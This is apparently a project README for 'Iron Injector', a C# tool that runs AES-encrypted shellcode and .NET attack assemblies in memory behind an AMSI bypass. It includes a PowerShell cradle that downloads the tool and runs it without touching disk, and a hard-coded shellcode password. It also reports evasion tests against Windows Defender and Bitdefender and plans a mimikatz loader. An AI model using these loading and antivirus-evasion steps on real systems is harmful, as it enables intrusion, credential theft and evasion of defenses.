# Iron Injector
Iron Injector is a c# program that allows the user to run a few modules from an interactive prompt. These include ShellLoader and ProgramLoader. ShellLoader serves to load AES encrypted shellcode, given the filename, url, and loader type. Programloader takes a url and program name and conducts a simple AMSI bypass to edit a registry value while the assembly is running and then repair it once the program loader module has been exited. While interacting with the assembly, users can send commands as they would normally do from the command line all while the assembly is in memory and has never touched disk.

![image](https://user-images.githubusercontent.com/15575425/158653309-61d17062-6b70-429e-b51c-527ca533f3bd.png)



## Usage & Command Info
The program comes with two main modules and a set of aux commands to be ran to help the user with input and navigation. 

### The help command
![image](https://user-images.githubusercontent.com/15575425/158652978-d4ff1f1a-6a73-4d3e-afd2-ea846275aa63.png)

### Loading Modules and execution
1. To load a module, just type out the name of the module. Ex: ShellLoader  
2. To see the Modules options, use the Options command.  
3. To set a modules option, use: Set optionName Value   
4. To execute the module, use run
![image](https://user-images.githubusercontent.com/15575425/158653827-46c72464-6336-44d0-b31b-0916156cd50b.png)

### AES encryption
At the moment, the shellcode loader only takes AES encrypted shellcode. See my ShellcodeEncryption project for code that works with this project to decrypt the shellcode. Either way, the shellcode encryption password that should be used is **!r0nInj3ct0r123!** 
https://github.com/Queen-City-Cyber/ShellcodeEncryption

### The Connect Assembly Command 
This command is used to connect to an already loaded assembly after using exit on the interactive prompt from when the assembly is loaded using program Loader. 
ex. ConnectAssembly name.exe
![image](https://user-images.githubusercontent.com/15575425/158664122-43ef2902-328e-4dd1-af1b-f0a1b11f7ecc.png)
This shows an already loaded rubeus.exe; then, using the exit command, I stopped interaction with it downloaded a new exe to interact with then used **connectassembly rubeus.exe** to restart the interaction with the assembly. 

### Loading Iron Injector in memeory
![image](https://user-images.githubusercontent.com/15575425/158663020-816a8615-8572-4c42-af76-59b3a1808ad6.png)
1. "$data = (New-Object System.Net.WebClient).DownloadData('http://127.0.0.1:8081/Iron Injector.exe')"    
2. "$assem =[System.Reflection.Assembly]::Load($data)"    
3. "[Iron_Injector.Program]::Main()"    
** NOTE: the double quotes are just for formatting do not include when running command**    

### AV bypass?
I have found it works best with stageless shellcode and the program loader uses an amsi bypass to patch a small registry entry this has been caught on some runs and not on others. Like all AV bypasses the challenge and techniques are always updating and the program will be updated with new techniques in the future. 

All testing was done as of 3/15/2022 against windows defender and bitdefender AV with cloud protections
![image](https://user-images.githubusercontent.com/15575425/158664740-80d23cc9-cd55-4cfd-80dc-4f8434b18659.png)
![image](https://user-images.githubusercontent.com/15575425/158664809-80b0e359-2dc5-4fde-9fb9-a541ee1146fb.png)
![image](https://user-images.githubusercontent.com/15575425/158664826-e80a9f72-a344-4d13-8e03-eb6803467a3c.png)


## Features
- verification of user commands vs available commands  
- verification that option trying to be set is real  
- checks that all required options are set before running  
- execution of encrypted shellcode   
- execution of .net assemblies with the ability to restart interaction all in memory  
- can itself be loaded into memory  

## Compile Instructions 
- download and open in VS, at the top set mode to release and CPU to any or x64 then build. 

## Possible Future content
- pe loader to load things like mimikatz  
- more shellcode loading methods  
- custom aes encryption password setting   
- better methods of AV bypass for loading .net assemblies  

## Disclaimer
I am not responsible for actions taken by users of Iron Injector. Iron Injector was released solely for educational and ethical purposes.
